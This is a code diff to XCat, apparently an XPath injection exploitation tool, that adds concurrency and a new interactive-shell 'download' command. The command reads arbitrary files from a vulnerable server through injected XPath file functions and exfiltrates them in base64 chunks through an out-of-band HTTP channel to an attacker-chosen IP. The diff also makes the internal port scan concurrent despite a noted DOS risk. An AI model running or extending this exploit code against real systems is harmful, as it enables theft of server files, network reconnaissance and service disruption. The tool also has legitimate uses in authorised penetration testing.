@@ -3,7 +3,7 @@ XCat.
 
 Usage:
     xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--shell] [--fast]
-         [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)] [--stats]
+         [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)] [--stats] [--concurrency=<val>]
     xcat detectip
 
 """
@@ -32,8 +32,9 @@ import shlex
 import base64
 
 from xcat.xpath import E
-from xcat.xpath.fs import write_text, append_binary, base_64_binary, delete
-from xcat.xpath.xpath_1 import concat, string
+from xcat.xpath.fs import write_text, append_binary, base_64_binary, delete, read_binary
+from xcat.xpath.saxon import read_binary_resource
+from xcat.xpath.xpath_1 import concat, string, string_length, substring
 from xcat.xpath.xpath_2 import doc, document_uri, current_date_time, doc_available, resolve_uri
 from xcat.xpath.xpath_3 import unparsed_text_lines, unparsed_text_available, unparsed_text, \
     available_environment_variables, environment_variable
@@ -64,20 +65,23 @@ def run():
     shell = arguments['--shell']
     fast = arguments['--fast']
     stats = arguments['--stats']
+    concurrency = arguments['--concurrency']
 
     loop = asyncio.get_event_loop()
     try:
         loop.run_until_complete(start_action(url, target_parameter,
                                              parameters, match_function,
                                              oob_ip, oop_port,
-                                             shell, fast, stats))
+                                             shell, fast, stats, concurrency))
     except KeyboardInterrupt:
         loop.stop()
 
 
-async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port, shell, fast, stats):
+async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port,
+                       shell, fast, stats, concurrency):
     async with aiohttp.ClientSession() as session:
-        payload_requester = Requester(url, target_parameter, parameters, match_function, session)
+        payload_requester = Requester(url, target_parameter, parameters, match_function,
+                                      session, concurrency=concurrency)
 
         print("Detecting injection points...")
         payloads = await detect_payload(payload_requester)
@@ -99,7 +103,7 @@ async def start_action(url, target_parameter, parameters, match_function, oob_ip
         requester = Requester(url, target_parameter, parameters, match_function, session,
                               injector=chosen_payload.payload_generator,
                               external_ip=oob_ip, external_port=oob_port,
-                              fast=fast)
+                              fast=fast, concurrency=concurrency)
 
         print("Detecting Features...")
         features = await detect_features(requester)
@@ -238,6 +242,42 @@ async def run_shell(requester: Requester):
                 else:
                     print('Appeared not to succeed. Might have though')
 
+        if command[0] == 'download':
+            if len(command) != 3:
+                print('download "remote path" "local path"')
+            else:
+                if (not requester.features['expath-file'] and not requester.features['saxon']) \
+                        or not requester.features['oob-http']:
+                    print('(expath and saxon) or doc function not supported, cannot continue')
+                    continue
+
+                remote, local = command[1], pathlib.Path(command[2])
+                if local.exists():
+                    print(f'{local} already exists! Not overwriting')
+                    continue
+
+                func = read_binary if requester.features['expath-file'] else read_binary_resource
+                expression = string(func(remote))
+
+                print(f'Downloading {remote} to {local}')
+
+                size = await count(requester, expression, func=string_length)
+                print(f'Size: {size}')
+
+                CHUNK_SIZE = 1024
+                result = ""
+                for index in range(1, size+1, CHUNK_SIZE):
+                    data = await get_string_via_oob(requester, substring(expression, index, CHUNK_SIZE))
+                    if data is None:
+                        sys.stdout.write('!')
+                    else:
+                        result += data
+                        sys.stdout.write(".")
+                    sys.stdout.flush()
+                sys.stdout.write('\n')
+                local.write_bytes(base64.decodebytes(result.encode()))
+                print(f'Downloaded, saved to {local}')
+
         if command[0] == 'upload':
             if len(command) != 3:
                 print('upload "local path" "remote path"')
@@ -302,6 +342,7 @@ async def run_shell(requester: Requester):
         if command[0] == "scan":
             if len(command) != 3:
                 print('scan "ip address or network" port')
+                print('If using an ip network ensure you wrap it in quotes')
             else:
                 addr, port = command[1], command[2]
                 try:
@@ -313,10 +354,17 @@ async def run_shell(requester: Requester):
                     print(f'Error: {e}')
                 else:
                     print(f'Scanning {len(addresses)} addresses')
-                    for addr in addresses:
+                    print('Some libraries implement a ridiculous timeout and this could DOS the server')
+                    if input('Are you sure you want to continue? [y/n] ').lower() != 'y':
+                        continue
+                    print('Top Tip: Use --concurrency to scan faster')
+
+                    async def _check(addr):
                         http_addr = f'http://{addr}:{port}/'
                         if await requester.check(unparsed_text_available(http_addr)):
                             print(f'{addr}:{port} - available')
+
+                    await asyncio.gather(*[_check(addr) for addr in addresses])
 
         if command[0] == "cat_xml":
             if len(command) != 2:
@@ -327,6 +375,7 @@ async def run_shell(requester: Requester):
         if command[0] in {"cat", "ls"}:
             if len(command) != 2:
                 print(f"{command[0]} 'path'")
+                print('Path can include external network resources (http, ftp, etc)')
             else:
                 if requester.features['unparsed-text']:
                     if not await requester.check(unparsed_text_available(command[1])):
